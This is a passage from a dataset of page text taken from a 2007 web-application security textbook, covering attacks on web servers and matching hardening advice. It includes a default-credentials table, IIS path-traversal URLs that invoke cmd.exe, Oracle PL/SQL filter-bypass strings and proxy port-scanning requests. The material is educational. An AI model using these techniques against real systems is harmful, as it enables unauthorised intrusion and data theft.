    "output": "70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 551\nChapter 16 ■ Attacking Application Architecture 551\nSegregate Components in a Shared Application\nIn an ASP environment where a single application comprises various shared\nand customizable components, trust boundaries should be enforced between\ncomponents that are under the control of different parties. When a shared\ncomponent, such as a database stored procedure, receives data from a cus-\ntomized component belonging to an individual customer, this data should be\ntreated with the same level of distrust as if it had originated directly from an\nend user. Each component should be subjected to rigorous security testing\noriginating from adjacent components outside its trust boundaries, to identify\nany defects that may enable a vulnerable or malicious component to compro-\nmise the wider application. Particular attention should be paid to shared log-\nging and administrative functions.\nChapter Summary\nSecurity controls implemented within web application architectures present a\nrange of opportunities for application owners to enhance the overall security\nposture of their deployment. As a consequence, defects and oversights within\nan application’s architecture can often enable you to dramatically escalate an\nattack, moving from one component to another to eventually compromise the\nentire application.\nShared hosting and ASP-based environments present a new range of diffi-\ncult security problems, involving trust boundaries that do not arise within a\nsingle-hosted application. When you are attacking an application in a shared\ncontext, a key focus of your effort should be on the shared environment itself,\nto ascertain whether it is possible to compromise that environment from\nwithin an individual application, or to leverage one vulnerable application to\nattack others.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. You are attacking an application that employs two different servers: an\napplication server and a database server. You have discovered a vulner-\nability which allows you to execute arbitrary operating system com-\nmands on the application server. Can you exploit this vulnerability to\nretrieve sensitive application data held within the database?\n2. In a different case, you have discovered a SQL injection flaw that can be\nexploited to execute arbitrary operating system commands on the data-\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 552\n552 Chapter 16 ■ Attacking Application Architecture\nbase server. Can you leverage this vulnerability to compromise the\napplication server? For example, could you modify the application’s\nscripts held on the application server, and the content returned to\nusers?\n3. You are attacking a web application that is hosted in a shared environ-\nment. By taking out a contract with the ISP, you are able to acquire\nsome web space on the same server as your target, where you are per-\nmitted to upload PHP scripts.\nCan you exploit this situation to compromise the application you are\ntargeting?\n4. The architecture components Linux, Apache, MySQL, and PHP are\noften found installed on the same physical server. Why can this dimin-\nish the security posture of the application’s architecture?\n5. How could you look for evidence that the application you are attacking\nis part of a wider application managed by an application service\nprovider?"
  },
  {
    "input": "Vulnerable Web Server Configuration",
    "output": "70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 553\nCHAPTER\n17\nAttacking the Web Server\nAs with any kind of application, a web application is dependent on the other\nlayers of the technology stack that support it, including the web server, oper-\nating system, and networking infrastructure. Any of these components may be\ntargeted by an attacker, and compromising the technology on which an appli-\ncation depends will very often enable an attacker to fully compromise the\napplication itself.\nMost attacks in this category are outside the scope of a book about attacking\nweb applications. One exception to this is attacks that target the web server\nlayer. The web server is intimately tied up with the application that runs on it,\nand defects within a web server can often be used to attack the application\ndirectly, rather than indirectly, by first compromising the underlying host.\nThis chapter focuses on ways of leveraging defects at the web server layer to\nattack the web application running on it. The vulnerabilities that you can\nexploit to attack web servers fall into two broad categories: shortcomings in\nthe server’s configuration and security flaws within the web server software.\nVulnerable Web Server Configuration\nEven the simplest of web servers comes with a wealth of configuration options\nthat control its behavior. Historically, many servers have shipped with insecure\n553\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 554\n554 Chapter 17 ■ Attacking the Web Server\ndefault options, which present opportunities for attack unless they are explic-\nitly hardened.\nDefault Credentials\nMany web servers contain administrative interfaces that may be publicly\naccessible. These may be located at a specific location within the web root or\nmay run on a different port such as 8080 or 8443. Frequently, administrative\ninterfaces have default credentials that are well known and are not required to\nbe changed on installation.\nExamples of default credentials on some of the most commonly encoun-\ntered administrative interfaces are shown in Table17-1.\nTable17-1: Default Credentials on Some Common Administrative Interfaces\nUSERNAME PASSWORD\nApache Tomcat admin (none)\ntomcat tomcat\nroot root\nSun JavaServer admin admin\nNetscape Enterprise Server admin admin\nCompaq Insight Manager administrator administrator\nanonymous (none)\nuser user\noperator operator\nuser public\nZeus admin (none)\nIn addition to administrative interfaces on web servers, numerous devices,\nsuch as switches, printers, and wireless access points, use web interfaces that\nhave default credentials that may not have been changed. The following\nresources list default credentials for a large number of different technologies:\n■■ www.cirt.net/cgi-bin/passwd.pl\n■■ www.phenoelit.de/dpl/dpl.html\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 555\nChapter 17 ■ Attacking the Web Server 555\nHACK STEPS\n■ Review the results of your application mapping exercises to identify the\nweb server and other technologies in use that may contain accessible\nadministrative interfaces.\n■ Perform a port scan of the web server to identify any administrative\ninterfaces running on a different port to the main target application.\n■ For any identified interfaces, consult the manufacturer’s documentation\nand the listings of common passwords to obtain default credentials.\n■ If the default credentials do not work, use the techniques described in\nChapter 6 to attempt to guess valid credentials.\n■ If you gain access to an administrative interface, review the available\nfunctionality and determine whether this can be used to further compro-\nmise the host and attack the main application.\nDefault Content\nMost web servers ship with a range of default content and functionality that\nyou may be able to leverage to attack either the server itself or the main target\napplication. Here are some examples of default content that may be of interest:\n■■ Debug and test functionality designed for use by administrators.\n■■ Sample functionality designed to demonstrate certain common tasks.\n■■ Powerful functions not intended for public use but unwittingly left\naccessible.\n■■ Web server manuals that may contain useful information that is diffi-\ncult to obtain elsewhere or is specific to the installation itself.\nDebug Functionality\nFunctionality designed for diagnostic use by administrators is often of great\nvalue to an attacker because it may contain useful information about the con-\nfiguration and runtime state of the server and applications running on it.\nFigure 17-1 shows the default page phpinfo.php, which exists on many\nApache installations. This page simply executes the PHP function phpinfo()\nand returns the output. It contains a wealth of information about the PHP\nenvironment, configuration settings, web server modules, and file paths.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 556\n556 Chapter 17 ■ Attacking the Web Server\nFigure17-1: The default page phpinfo.php\nSample Functionality\nMany servers include by default various sample scripts and pages designed to\ndemonstrate how certain web server functions and APIs can be used. Typi-\ncally, these are intended to be innocuous and to provide no opportunities for\nan attacker. However, in practice this has not been the case, for two reasons:\n■■ Many sample scripts contain security vulnerabilities that could be\nexploited to perform actions not intended by the scripts’ authors.\n■■ Many sample scripts actually implement functionality that is of direct\nuse to an attacker.\nAn example of the first problem is the CodeBrws.asp sample script that\nshipped with older versions of Microsoft IIS server. The script was designed to\nallow users to view the source code to other scripts within the sample scripts\ndirectory, in order to see how they worked. The script accepted a filename as\ninput and returned its source code. To prevent path traversal attacks, the script\nchecked for dot-dot-slash sequences within the user-supplied filename (see\nChapter 10). However, by submitting alternative Unicode-encoded forms of dot-\ndot-slash, an attacker could step above the /ISSSAMPLESdirectory and access the\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 557\nChapter 17 ■ Attacking the Web Server 557\nsource code to any script located within the web root. Other IIS sample scripts\nhave contained vulnerabilities which enabled an attacker to execute database\nqueries, brute force Windows account credentials, and perform cross-site script-\ning. In addition to fixing the specific vulnerabilities concerned, Microsoft has\nremoved sample content altogether from later versions of IIS, to prevent this\nkind of problem from arising.\nAn example of the second problem is the Sessions Example script shipped\nwith Apache Tomcat. As shown in Figure17-2, this can be used to get and set\narbitrary session variables. If an application running on the server stores sen-\nsitive data in a user’s session, an attacker can view this and may be able to\ninterfere with the application’s processing by modifying its value.\nFigure17-2: The default Sessions Example script shipped with Apache Tomcat\nPowerful Functions\nSome web server software contains powerful functionality that is not intended\nto be used by the public, but which can be accessed by end users through some\nmeans.\nOne example of powerful default functionality arises in the PL/SQL gateway\nimplemented by Oracle Application Server. This provides an interface whereby\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 558\n558 Chapter 17 ■ Attacking the Web Server\nweb requests are proxied to a back-end Oracle database. Arbitrary parameters\ncan be passed to database procedures using URLs like the following:\nhttps://wahh-app.com/pls/dad/package.procedure?param1=foo&param2=bar\nThis functionality is intended to provide a ready means of converting busi-\nness logic implemented within a database into a user-friendly web applica-\ntion. However, because an attacker can specify an arbitrary procedure, he can\nexploit the PL/SQL gateway to access powerful functions within the database.\nFor example, the SYS.OWA_UTIL.CELLSPRINTprocedure can be used to execute\narbitrary database queries, and thereby retrieve sensitive data:\nhttps://wahh-app.com/pls/dad/SYS.OWA_UTIL.CELLSPRINT?P_THEQUERY=\nSELECT+*+FROM+users\nTo prevent attacks of this kind, Oracle introduced a filter known as the\nPL/SQL Exclusion List. This checks the name of the package being accessed\nand blocks attempts to access any packages whose names start with the fol-\nlowing expressions:\nSYS.\nDBMS_\nUTL_\nOWA_\nOWA.\nHTP.\nHTF.\nThis filter was designed to block access to powerful default functionality\nwithin the database. However, the list was incomplete and did not block\naccess to other powerful default procedures owned by DBA accounts such as\nCTXSYS and MDSYS. There were further problems associated with the PL/SQL\nExclusion List, as described later in this chapter.\nHACK STEPS\n■ Tools such as Nikto are effective at locating much default web content.\nThe application mapping exercises described in Chapter 4 ought to have\nidentified the majority of default content present on the server you are\ntargeting.\n■ Use search engines and other resources to identify default content and\nfunctionality included within the technologies known to be in use. If fea-\nsible, carry out a local installation of these, and review them for any\ndefault functionality that you may be able to leverage in your attack.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 559\nChapter 17 ■ Attacking the Web Server 559\nDirectory Listings\nWhen a web server receives a request for a directory, rather than an actual file,\nit may respond in one of three ways:\n■■ It may return a default resource within the directory, such as\nindex.html.\n■■ It may return an error, such as the HTTP status code 403, indicating that\nthe request is not permitted.\n■■ It may return a listing showing the contents of the directory, as shown\nin Figure17-3.\nFigure17-3: A directory listing\nIn many situations, directory listings do not have any relevance to secu-\nrity. For example, disclosing the index to an images directory may be com-\npletely inconsequential. Indeed, directory listings are often disclosed\nintentionally because they provide a built-in means of navigating around\nsites containing static content, as in the example illustrated. Nevertheless,\nthere are two main reasons why obtaining directory listings may assist you\nin attacking an application:\n■■ Many applications do not enforce proper access control over their func-\ntionality and resources, and rely upon an attacker’s ignorance of the\nURLs used to access sensitive items (see Chapter 8).\n■■ Files and directories are often unintentionally left within the web root\nof servers, such as logs, backup files, old versions of scripts, and so on.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 560\n560 Chapter 17 ■ Attacking the Web Server\nIn both of these cases, the real vulnerability lies elsewhere, in the failure to\ncontrol access to sensitive data. But given that these vulnerabilities are extremely\nprevalent, and the names of the insecure resources may be difficult to guess, the\navailability of directory listings is often of great value to an attacker, and may\nlead quickly to a complete compromise of an application.\nHACK STEPS\n■ For each directory discovered on the web server during application map-\nping, make a request for just this directory and identify any cases where\na directory listing is returned.\nNOTE In addition to the precedingcase, where directory listings are directly\navailable, numerous vulnerabilities have been discovered within web server\nsoftware that can be exploited to obtain a directory listing. Some examples of\nthese are described later in this chapter.\nDangerous HTTP Methods\nAs described in Chapter 3, HTTP requests can use a range of different methods\nother than the standard GET and POST methods. Many of these methods are\ndesigned for unusual and specialized tasks. If they are accessible by low-priv-\nileged users, they may provide an effective avenue for attacking an applica-\ntion. Here are some methods to look for:\n■■ PUT — Uploads the attached file to the specified location.\n■■ DELETE — Deletes the specified resource.\n■■ COPY — Copies the specified resource to the location given in the\nDestinationheader.\n■■ MOVE — Moves the specified resource to the location given in the\nDestinationheader.\n■■ SEARCH — Searches a directory path for resources.\n■■ PROPFIND — Retrieves information about the specified resource,\nsuch as author, size, and content type.\n■■ TRACE — Returns in the response body the exact request received by\nthe server. This may be used to circumvent some protections against\ncross-site scripting (see Chapter 12).\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 561\nChapter 17 ■ Attacking the Web Server 561\nSeveral of these methods are part of the WebDAV (Web-based Distributed\nAuthoring and Versioning) extensions to the HTTP protocol, which allow for\ncollaborative editing and management of web server content.\nYou can use the OPTIONSmethod to list the HTTP methods that are permit-\nted in a particular directory. For example:\nOPTIONS / HTTP/1.0\nHost: wahh-app.com\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Tue, 01 May 2007 12:41:41 GMT\nX-Powered-By: ASP.NET\nMS-Author-Via: MS-FP/4.0,DAV\nContent-Length: 0\nAccept-Ranges: none\nDASL: <DAV:sql>\nDAV: 1, 2\nPublic: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL,\nPROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH\nAllow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\nThis response indicates that several of the powerful methods listed previ-\nously are in fact allowed. However, in practice these may require authentica-\ntion or be subject to other restrictions.\nThe PUT method is particularly dangerous. If you upload arbitrary files\nwithin the web root, then you can probably create new scripts on the server\nthereby gaining full control of the application, and often the web server itself.\nIf the PUTmethod appears to be present and enabled, you can verify this as fol-\nlows:\nPUT /test.txt HTTP/1.1\nHost: wahh-app.com\nContent-Length: 4\ntest\nHTTP/1.1 201 Created\n...\nNOTE Older versions of IIS 5 contained a vulnerability whereby the WebDAV\nSEARCHmethod could be used to obtain a listing of the web root and all\nsubdirectories. For more details, see www.securityfocus.com/bid/1756.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 562\n562 Chapter 17 ■ Attacking the Web Server\nHACK STEPS\n■ Use the OPTIONSmethod to list the HTTP methods that the server states\nare available. Note that different methods may be enabled in different\ndirectories.\n■ In many cases, methods may be advertised as available that you cannot\nin fact use. Sometimes, a method may be usable even though it is not\nlisted in the response to the OPTIONSrequest. Try each method manually\nto confirm whether it can in fact be used. Scanners such as Paros will\ntest the PUTmethod against each directory discovered during a scan.\n■ If you find that some WebDAV methods are enabled, it is often easiest to\nuse a WebDAV-enabled client for further investigation, such as Microsoft\nFrontPage or the Open as Web Folder option within Internet Explorer.\nThe Web Server as a Proxy\nWeb servers are sometimes configured to act as forward or reverse HTTP\nproxy servers (see Chapter 3). If a server is configured as a forward proxy, then\ndepending on its configuration, it may be possible to leverage the server to\nperform various attacks as follows:\n■■ An attacker may be able to use the server to attack third-party systems\non the Internet, with the malicious traffic appearing to the target to\noriginate from the vulnerable proxy server.\n■■ An attacker may be able to use the proxy to connect to arbitrary hosts\non the organization’s internal network, thereby reaching targets that\ncannot be accessed directly from the Internet.\n■■ An attacker may be able to use the proxy to connect back to other ser-\nvices running on the proxy host itself, circumventing firewall restric-\ntions and potentially exploiting trust relationships to bypass\nauthentication.\nThere are two main techniques that you can use to cause a forward proxy to\nmake onward connections. First, you can send an HTTP request containing a\nfull URL including a hostname and (optionally) a port number. For example:\nGET http://wahh-otherapp.com:80/ HTTP/1.0\nHTTP/1.1 200 OK\n...\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 563\nChapter 17 ■ Attacking the Web Server 563\nIf the server has been configured to forward requests to the specified host,\nthen it will return content from that host. Be sure to verify that the content\nreturned is not from the original server, however. Most web servers accept\nrequests containing full URLs, and many will simply ignore the host portion\nand return the requested resource from within their own web root.\nThe second way of leveraging a proxy is to use the CONNECTmethod to spec-\nify the target hostname and port number. For example:\nCONNECT wahh-otherapp.com:443 HTTP/1.0\nHTTP/1.0 200 Connection established\nIf the server responds in this way, then it is proxying your connection. This\nsecond technique is often more powerful because the proxy server will now\nsimply forward all traffic sent to and from the specified host, enabling you to\ntunnel other protocols over the connection and attack non-HTTP–based ser-\nvices. However, most proxy servers impose narrow restrictions on the ports\nthat can be reached via the CONNECT method, and usually only allow connec-\ntions to port 443.\nWhen you are attempting to connect to hosts within an organization’s inter-\nnal network, you can effectively leverage the proxy server to scan ranges of IP\naddresses for web server ports, or scan specific addresses for a range of ports,\nusing either of the preceding techniques. For example, the following response\nindicates that port 12345 is not open on the target host:\nGET http://192.168.1.1:12345 HTTP/1.0\nHTTP/1.1 502 Bad Gateway\nContent-Length: 315\nConnection: close\n...\nThe proxy server received an invalid response from an upstream server.\n...\nThe following response confirms that port 22 is open and returns the service\nbanner:\nGET http://192.168.1.1:22 HTTP/1.0\nHTTP/1.1 200 OK\nConnection: close\nSSH-2.0-OpenSSH_4.2Protocol mismatch.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 564\n564 Chapter 17 ■ Attacking the Web Server\nThe following response indicates that port 111 is open but that no banner\nwas retrieved:\nGET http://192.168.1.1.111 HTTP/1.0\nHTTP/1.1 502 Proxy Error\nContent-Length: 510\nConnection: close\n...\nThe proxy server could not handle the request http://192.168.1.1:111\nReason: Error reading from remote server\n...\nHACK STEPS\n■ Using both GETand CONNECTrequests, try to use the web server as a\nproxy to connect to other servers on the Internet, and retrieve content\nfrom them.\n■ Using both techniques, attempt to connect to different IP addresses and\nports within the hosting infrastructure.\n■ Using both techniques, attempt to connect to common port numbers on\nthe web server itself, by specifying 127.0.0.1 as the target host in the\nrequest.\nMisconfigured Virtual Hosting\nIn Chapter 16, we described how web servers can be configured to host multi-\nple web sites, with the HTTP Host header being used to identify the web site\nwhose content should be returned. In Apache, virtual hosts are configured as\nfollows:\n<VirtualHost *>\nServerName wahh-app.com\nDocumentRoot /www/wahh\n</VirtualHost>\nIn addition to the DocumentRootdirective, virtual host containers can also be\nused to specify other configuration options for the web site in question. A com-\nmon configuration mistake is to overlook the default host, so that any security\nconfiguration only applies to a virtual host and can be bypassed when the\ndefault host is accessed.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 565\nChapter 17 ■ Attacking the Web Server 565\nHACK STEPS\n■ Submit GETrequests to the root directory using:\n■ The correct Hostheader.\n■ A bogus Hostheader.\n■ The server’s IP address in the Hostheader.\n■ No Hostheader.\n■ Compare the responses to these requests. A common result is that direc-\ntory listings are obtained when an IP address is used in the Hostheader.\nYou may also find that different default content is accessible.\n■ If different behavior is observed, repeat your application mapping\nexercises using the Hostheader that generated different results. Be\nsure to perform a Nikto scan using the -vhostoption, to identify any\ndefault content that may have been overlooked during initial application\nmapping.\nSecuring Web Server Configuration\nSecuring the configuration of a web server is not inherently a difficult task,\nand problems typically arise through oversight or lack of awareness. The most\nimportant task is to fully understand the documentation for the software you\nare using and any hardening guides available in relation to it.\nIn terms of generic configuration issues to address, be sure to include all of\nthe following areas:\n■■ Change any default credentials, including both usernames and pass-\nwords if possible. Remove any default accounts that are not required.\n■■ Block public access to administrative interfaces, either by placing ACLs\non the relevant paths within the web root or by firewalling access to\nnonstandard ports.\n■■ Remove all default content and functionality that is not strictly required\nfor business purposes. Browse the contents of your web directories to\nidentify any remaining items, and use tools such as Nikto as a sec-\nondary check.\n■■ If any default functionality is retained, harden this as far as possible to\ndisable unnecessary options and behavior.\n■■ Check all web directories for directory listings. Where possible, disable\ndirectory listings in a server-wide configuration. You can also ensure"
  },
  {
    "input": "Vulnerable Web Server Software",
    "output": "70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 566\n566 Chapter 17 ■ Attacking the Web Server\nthat each directory contains a file such as index.html, which the server\nis configured to serve by default.\n■■ Disable all methods other than those used by the application (typically\nGETand POST).\n■■ Ensure that the web server is not configured to run as a proxy. If this\nfunctionality is actually required, harden the configuration as far as\npossible to allow connections only to the specific hosts and ports that\nmay be legitimately accessed. You may also implement network-layer\nfiltering as a secondary measure to control outbound requests originat-\ning from the web server.\n■■ If your web server supports virtual hosting, ensure that any security\nhardening applied is enforced on the default host. Perform the tests\ndescribed previouslyto verify that this is the case.\nVulnerable Web Server Software\nWeb server products range from extremely simple and lightweight software\nwhich does little more than serve up static pages, to highly complex applica-\ntion platforms that can handle a large variety of tasks. Historically, web server\nsoftware has been subject to a wide range of serious security vulnerabilities,\nwhich have resulted in arbitrary code execution, file disclosure, and privilege\nescalation.\nAny book cataloging software vulnerabilities that vendors have patched will\ngradually become obsolete as those patches are applied by the vendor’s cus-\ntomers. What is more important is to understand the principles and techniques\nthat arise in this area. In the remainder of this chapter, we will examine some\nexamples of the different types of defects that have afflicted web servers, and\ndescribe a methodology that can be used to identify new vulnerabilities as\nthese are discovered. There are numerous other prominent vulnerabilities,\nwhich we do not have space to include here, leading to directory listings, source\ncode disclosure, and other problems.\nBuffer Overflow Vulnerabilities\nBuffer overflows are among the most serious flaws that can affect any kind of\nsoftware, because they normally allow an attacker to take control of execution\nin the vulnerable process (see Chapter 15). Achieving arbitrary code execution\nwithin a web server will usually enable an attacker to compromise any appli-\ncation that it is hosting.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 567\nChapter 17 ■ Attacking the Web Server 567\nThe following sections present a tiny sample of web server buffer overflows;\nhowever, they illustrate the pervasiveness of this flaw, which has arisen in a\nwide range of different web server products and components.\nMicrosoft IIS ISAPI Extensions\nMicrosoft IIS versions 4 and 5 contained a range of ISAPI extensions that were\nenabled by default. Several of these were found to contain buffer overflows,\nsuch as the Internet Printing Protocol extension and the Index Server exten-\nsion, both of which were discovered in 2001. These flaws enabled an attacker\nto execute arbitrary code within the Local System context, thereby fully com-\npromising the whole computer, and provided the means of propagation of the\nNimda and Code Red worms, which began circulating shortly afterwards. The\nfollowing Microsoft TechNet bulletins detail these flaws:\n■■ www.microsoft.com/technet/security/bulletin/MS01-023.mspx\n■■ www.microsoft.com/technet/security/bulletin/MS01-033.mspx\nApache Chunked Encoding Overflow\nA buffer overflow resulting from an integer signedness error was discovered\nin 2002 in the Apache web server. The affected code had been reused in numer-\nous other web sever products, which were also affected. For more details, see\nwww.securityfocus.com/bid/5033/discuss.\nMicrosoft IIS WebDav Overflow\nA buffer overflow in a core component of the Windows operating system was\ndiscovered in 2003. There were various attack vectors by which this bug could\nbe exploited, the most significant of which for many customers was the Web-\nDAV support built in to IIS 5. The vulnerability was being actively exploited in\nthe wild at the time a fix was produced. This vulnerability is detailed at\nwww.microsoft.com/technet/security/bulletin/MS03-007.mspx.\niPlanet Search Overflow\nThe search component of the iPlanet web server was found to be vulnerable to a\nstack overflow in 2002. By supplying an overlong parameter value, an attacker\ncould achieve execution of arbitrary code, by default with Local System privi-\nleges. For more details, see www.ngssoftware.com/advisories/sun-iws.txt.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 568\n568 Chapter 17 ■ Attacking the Web Server\nPath Traversal Vulnerabilities\nIn Chapter 10 we described how path traversal vulnerabilities can arise in web\napplications. The same types of problems have also arisen within numerous\ntypes of web server software, enabling an attacker to read or write arbitrary\nfiles outside the web root.\nAccipiter DirectServer\nThis path traversal flaw could be exploited by placing URL-encoded dot-dot-\nslash sequences into a request. For more information about this flaw, see\nwww.securityfocus.com/bid/9389.\nAlibaba\nThis path traversal flaw could be exploited by placing simple dot-dot-\nslash sequences into a request. For more information about this flaw, see\nwww.securityfocus.com/bid/270.\nCisco ACS Acme.server\nThis path traversal flaw could be exploited by adding slashes after the host-\nname in a URL. This caused the web server to retrieve files from the root of the\nserver file system. For more information about this flaw, see www.ciac.org/\nciac/bulletins/m-097.shtml.\nMcAfee EPolicy Orcestrator\nThis product used a POSTrequest to upload user-supplied data and write this\nto a user-supplied location. An arbitrary file anywhere on the file system could\nsimply be specified in the request. For more information about this flaw, see\nwww.securityfocus.com/bid/18979.\nEncoding and Canonicalization Vulnerabilities\nAs described in Chapter 3, various schemes exist that allow unusual characters\nand content to be encoded for safe transmission over HTTP. You have already\nseen, in the context of several types of web application vulnerability, how an\nattacker can leverage these schemes to evade input validation checks and per-\nform other attacks.\nEncoding flaws have arisen in many kinds of web server software and pre-\nsent an inherent threat in situations where the same user-supplied data is\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 569\nChapter 17 ■ Attacking the Web Server 569\nprocessed by several layers using different technologies. A typical web request\nmight be handled by the web server, the application platform, various man-\naged and unmanaged APIs, other software components, and the underlying\noperating system. If different components handle an encoding scheme in dif-\nferent ways, or perform additional decoding or interpretation of data that has\nalready been partially processed, then this can often be exploited to bypass fil-\nters or cause other anomalous behavior.\nAllaire JRun Directory Listing Vulnerability\nIn 2001, a vulnerability was found in Allaire JRun that enabled an attacker to\nretrieve directory listings even in directories containing a default file such as\nindex.html. A listing could be retrieved using URLs with the following form:\nhttps://wahh-app.com/dir/%3f.jsp\n%3fis a URL-encoded question mark, which is normally used to denote the\nstart of the query string. The problem arose because the initial URL parser did\nnot interpret the %3f as being the query string indicator. Treating the URL as\nending with .jsp, the server passed the request to the component that handles\nrequests for JSP files. This component then decoded the %3f, interpreted this as\nthe start of the query string, found that the resulting base URL was not a JSP\nfile, and so returned the directory listing. Further details can be found at\nwww.securityfocus.com/bid/3592.\nMicrosoft IIS Unicode Path Traversal Vulnerabilities\nTwo related vulnerabilities were identified in the Microsoft IIS server in 2000\nand 2001. To prevent path traversal attacks, IIS checked for requests containing\nthe dot-dot-slash sequence in both its literal and URL-encoded forms. If a\nrequest did not contain these expressions, then it was accepted for further pro-\ncessing. However, the server then performed some additional canonicalization\non the requested URL, enabling an attacker to bypass the filter and cause the\nserver to process traversal sequences.\nIn the first vulnerability, an attacker could supply various illegal Unicode-\nencoded forms of the dot-dot-slash sequence, such as ..%c0%af. This expres-\nsion did not match IIS’s upfront filters, but the later processing tolerated the\nillegal encoding, and converted it back to a literal traversal sequence. This\nenabled an attacker to step out of the web root and execute arbitrary com-\nmands with URLs like the following:\nhttps://wahh-app.com/scripts/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../\nwinnt/system32/cmd.exe?/c+dir+c:\\\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 570\n570 Chapter 17 ■ Attacking the Web Server\nIn the second vulnerability, an attacker could supply double-encoded forms\nof the dot-dot-slash sequence, such as ..%255c. Again, this expression did not\nmatch IIS’s filters, but the later processing performed a superfluous decode of\nthe input, thereby converting it back to a literal traversal sequence. This\nenabled an alternative attack with URLs like the following:\nhttps://wahh-app.com/scripts/..%255c..%255c..%255c..%255c..%255c..\n%255cwinnt/system32/cmd.exe?/c+dir+c:\\\nFurther details of these vulnerabilities can be found here:\n■■ www.microsoft.com/technet/security/bulletin/MS00-078.mspx\n■■ www.microsoft.com/technet/security/bulletin/MS01-026.mspx\nOracle PL/SQL Exclusion List Bypasses\nRecall the dangerous default functionality that was accessible via Oracle’s\nPL/SQL gateway. To address this issue, Oracle created the PL/SQL Exclusion\nList, which blocks access to packages whose names begin with certain expres-\nsions, such as OWAand SYS.\nA series of bypasses to the PL/SQL Exclusion List have been discovered\nsince 2001 by David Litchfield. In the first vulnerability, the filter can be\nbypassed by placing whitespace (such as a newline, space, or tab) before the\npackage name. For example:\nhttps://wahh-app.com/pls/dad/%0ASYS.package.procedure\nThis bypasses the filter, and the back-end database ignores whitespace,\ncausing the dangerous package to be executed. In the second vulnerability, the\nfilter can be bypassed by replacing the letter Y with %FF, which represents the\nÿ character:\nhttps://wahh-app.com/pls/dad/S%FFS.package.procedure\nThis bypasses the filter, and the back-end database canonicalizes the charac-\nter back to a standard Y, thereby invoking the dangerous package. In the third\nvulnerability, the filter can be bypassed by enclosing a blocked expression in\ndouble quotation marks:\nhttps://wahh-app.com/pls/dad/”SYS”.package.procedure\nThis bypasses the filter, and the back-end database tolerates quoted package\nnames, meaning that the dangerous package is invoked. In the fourth vulner-\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 571\nChapter 17 ■ Attacking the Web Server 571\nability, the filter can be bypassed by using angle brackets to place a program-\nming gotolabel before the blocked expression:\nhttps://wahh-app.com/pls/dad/<<FOO>>SYS.package.procedure\nThis bypasses the filter, and the back-end database ignores the goto label,\nand so executes the dangerous package.\nEach of these different vulnerabilities arises because the front-end filtering\nis performed by one component, on the basis of simple text-based pattern\nmatching, while the subsequent processing is performed by a different com-\nponent, which follows its own rules to interpret the syntactic and semantic sig-\nnificance of the input. Any differences between the two sets of rules may\npresent an opportunity for an attacker to supply input that does not match the\npatterns used in the filter but that the database interprets in such a way that\nthe attacker’s desired package is invoked. Because the Oracle database is so\nextremely functional, there is ample scope for differences of this kind to arise.\nMore information about these vulnerabilities can be found here:\n■■ www.securityfocus.com/archive/1/423819/100/0/threaded\n■■ The Oracle Hacker’s Handbookby David Litchfield (Wiley, 2007)\nFinding Web Server Flaws\nIf you are lucky, the web server you are targeting may contain some of the\nactual vulnerabilities described in this chapter. More likely, however, it will\nhave been patched to a more recent level, and you will need to search for\nsomething fairly current or brand new with which to attack the server.\nA good starting point when looking for vulnerabilities in an off-the-shelf\nproduct like a web server is to use an automated scanning tool. Unlike web\napplications, which are usually custom-built, almost all web server deploy-\nments use third-party software that has been installed and configured in the\nsame way that countless people have done before. In this situation, automated\nscanners can be highly effective at quickly locating low-hanging fruit, by send-\ning huge numbers of crafted requests and monitoring for signatures indicating\nthe presence of known vulnerabilities. Nessus is an excellent free vulnerability\nscanner, and there are various commercial alternatives available, such as\nTyphon and ISS.\nIn addition to running scanning tools, you should always perform your own\nresearch into the software you are attacking. Consult resources like Security\nFocus and the mailing lists Bugtraq and Full Disclosure to find details of any\nrecently discovered vulnerabilities that may not have been fixed on your target.\n70779c17.qxd:WileyRed 9/14/07 3:15 PM Page 572\n572 Chapter 17 ■ Attacking the Web Server\nYou should be aware that some web application products include an open\nsource web server such as Apache or Jetty as part of their installation. Security\nupdates to these bundled servers may be applied more slowly because admin-\nistrators may view the server as part of the installed application, rather than as\npart of the infrastructure they are responsible for. Further, standard service\nbanners may have been modified in this situation. Performing some manual\ntesting and research into the software may, therefore, be highly effective in\nidentifying defects that an automated scanner may miss.\nIf possible, you should consider performing a local installation of the soft-\nware you are attacking, and carry out your own testing to find new vulnera-\nbilities that have not been discovered or widely circulated.\nSecuring Web Server Software\nTo some extent, an organization deploying a third-party web server product is\ninevitably placing its fate in the hands of the software vendor. Nevertheless,\nthere is still a large amount that a security-conscious organization can do to\nprotect itself against the kind of software vulnerabilities described in this\nchapter.\nChoose Software with a Good Track Record\nNot all software products and vendors were created equal. Taking a look at the\nrecent history of different server products reveals some marked differences in\nthe quantity of serious vulnerabilities found, the time taken by vendors to\nresolve them, and the resilience of the released fixes to subsequent testing by\nresearchers. Before choosing which web server software to deploy, you should\ninvestigate these differences, and consider how your organization would have\nfared in recent years if it had used each kind of software you are considering.\nApply Vendor Patches\nAny decent software vendor must release security updates periodically. Some-\ntimes, these address issues that the vendor themselves discovered in-house. In\nother cases, the problems were reported by an independent 